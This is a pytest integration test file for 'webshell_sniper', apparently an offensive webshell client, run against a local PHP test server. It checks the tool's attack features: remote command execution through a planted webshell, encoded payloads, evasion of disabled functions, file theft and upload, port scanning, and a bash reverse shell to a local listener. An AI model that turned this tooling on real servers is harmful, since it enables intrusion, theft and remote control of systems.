"""End-to-end tests against a real ``php -S`` target (see conftest)."""

from __future__ import annotations

import socket
import threading
import time
from pathlib import Path

import pytest

from webshell_sniper.config import Config
from webshell_sniper.core.php import php_string
from webshell_sniper.core.webshell import WebShell
from webshell_sniper.features import files, portscan, recon, revshell

pytestmark = pytest.mark.integration


def test_connect_and_metadata(live_shell: WebShell):
    assert live_shell.working
    assert live_shell.php_version.startswith(("7.", "8."))
    assert Path(live_shell.webroot).name == "webroot0"


def test_run_php_survives_quotes(live_shell: WebShell):
    # The exact payload that would have shattered v1's naive interpolation.
    assert live_shell.run_php(r"""echo "a'b\"c" """) == "a'b\"c"


def test_run_command(live_shell: WebShell):
    assert live_shell.run_command("echo hello-cmd").strip() == "hello-cmd"


def test_read_and_existence(live_shell: WebShell):
    secret = str(Path(live_shell.webroot) / "secret.txt")
    assert "hello-from-target" in files.read_file(live_shell, secret)
    assert files.file_exists(live_shell, secret)
    assert not files.file_exists(live_shell, "/nope/nope")
    assert files.is_directory(live_shell, str(Path(live_shell.webroot) / "sub"))


def test_download_skips_unchanged(live_shell: WebShell, tmp_path: Path):
    secret = str(Path(live_shell.webroot) / "secret.txt")
    files.download(live_shell, secret, tmp_path)
    saved = tmp_path / live_shell.transport.url.split("//")[1].split("/")[0] / secret.lstrip("/")
    assert saved.read_text() == "hello-from-target"


def test_disabled_function_fallback(php_target: dict[str, object], tmp_path: Path):
    """system disabled -> executor must transparently fall back."""
    # The session target has nothing disabled; spin a focused unit-level check
    # by forcing the disabled set instead (a dedicated -d server lives in CI).
    ws = WebShell(f"{php_target['base']}/index.php", "POST", "c", Config(output_dir=tmp_path))
    assert ws.connect()
    ws.executor._disabled = {"system", "passthru", "shell_exec"}
    ws.executor._exec_function = None
    assert ws.executor.pick_exec_function() == "exec"
    assert ws.run_command("echo viafallback").strip() == "viafallback"


def test_find_writable_dirs(live_shell: WebShell):
    dirs = recon.find_writable_dirs(live_shell)
    assert any(d.endswith("webroot0") for d in dirs)


@pytest.mark.parametrize("encoder", ["base64", "gzip", "xor"])
def test_every_encoder_executes(php_target: dict[str, object], tmp_path: Path, encoder: str):
    """Each wire encoding must actually run against a real PHP interpreter."""
    config = Config(output_dir=tmp_path, encoder=encoder)
    ws = WebShell(f"{php_target['base']}/index.php", "POST", "c", config)
    assert ws.connect(), f"{encoder} failed to connect"
    assert ws.run_command("echo enc-ok").strip() == "enc-ok"
    assert ws.run_php(r"""echo "q'q" """) == "q'q"


def test_connect_reason_wrong_password(php_target: dict[str, object], tmp_path: Path):
    ws = WebShell(
        f"{php_target['base']}/index.php", "POST", "wrongparam", Config(output_dir=tmp_path)
    )
    assert not ws.connect()
    assert ws.reason is not None
    assert "did not execute" in ws.reason


def test_connect_reason_unreachable(tmp_path: Path):
    ws = WebShell("http://127.0.0.1:1/nope.php", "POST", "c", Config(output_dir=tmp_path))
    assert not ws.connect()
    assert ws.reason is not None
    assert "unreachable" in ws.reason


def test_remove_file(live_shell: WebShell):
    target = str(Path(live_shell.webroot) / "to_delete.txt")
    live_shell.run_php(f"file_put_contents({php_string(target)}, 'bye')")
    assert files.file_exists(live_shell, target)
    assert files.remove(live_shell, target)
    assert not files.file_exists(live_shell, target)


def test_upload_file(live_shell: WebShell, tmp_path: Path):
    local = tmp_path / "payload.bin"
    local.write_bytes(b"uploaded-\x00-content")
    remote = str(Path(live_shell.webroot) / "uploaded.bin")
    assert files.upload(live_shell, local, remote)
    assert files.file_exists(live_shell, remote)
    assert "uploaded-" in files.read_file(live_shell, remote)


def test_reverse_shell_bash_connects_back(php_target: dict[str, object], tmp_path: Path):
    """Fire a bash reverse shell at a local listener and confirm it executes."""
    ws = WebShell(
        f"{php_target['base']}/index.php", "POST", "c", Config(output_dir=tmp_path, timeout=4)
    )
    assert ws.connect()

    server = socket.socket()
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server.bind(("127.0.0.1", 0))
    server.listen(1)
    port = server.getsockname()[1]
    received: dict[str, bytes] = {}

    def handle() -> None:
        conn, _ = server.accept()
        conn.sendall(b"echo PWNED\n")
        time.sleep(1)
        received["data"] = conn.recv(4096)
        conn.close()

    thread = threading.Thread(target=handle)
    thread.start()
    revshell.reverse_shell(ws, "127.0.0.1", port, method="bash")
    thread.join(timeout=10)
    server.close()
    assert b"PWNED" in received.get("data", b"")


def test_port_scan_with_banner(php_target: dict[str, object], tmp_path: Path):
    """Scan a local service that greets on connect and confirm the banner shows."""
    server = socket.socket()
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server.bind(("127.0.0.1", 0))
    server.listen(1)
    port = server.getsockname()[1]

    def greet() -> None:
        conn, _ = server.accept()
        conn.sendall(b"SSH-2.0-TestBanner\r\n")
        time.sleep(0.2)
        conn.close()

    threading.Thread(target=greet, daemon=True).start()
    ws = WebShell(
        f"{php_target['base']}/index.php", "POST", "c", Config(output_dir=tmp_path, timeout=10)
    )
    assert ws.connect()
    output = portscan.port_scan(ws, "127.0.0.1/32", str(port), banner=True)
    server.close()
    assert f"127.0.0.1:{port} open" in output
    assert "TestBanner" in output


def test_cwd_tracking(php_target: dict[str, object], tmp_path: Path):
    from webshell_sniper.repl import Repl

    config = Config(output_dir=tmp_path)
    ws = WebShell(f"{php_target['base']}/index.php", "POST", "c", config)
    assert ws.connect()
    repl = Repl([ws], config)
    repl.do_cd("/tmp")
    assert repl.cwd == "/tmp"
    # Subsequent commands run relative to the tracked cwd.
    assert repl._remote_command(ws, "pwd").strip() == "/tmp"


def test_batch_exec_and_info(php_target: dict[str, object], tmp_path: Path):
    from webshell_sniper.batch import run_batch

    config = Config(output_dir=tmp_path)
    ws = WebShell(f"{php_target['base']}/index.php", "POST", "c", config)
    assert ws.connect()

    execd = run_batch([ws], "exec", "echo batchok", config)
    assert execd[0]["ok"]
    assert "batchok" in execd[0]["data"]

    info = run_batch([ws], "info", None, config)
    assert info[0]["ok"]
    assert info[0]["data"]["php_version"].startswith(("7.", "8."))
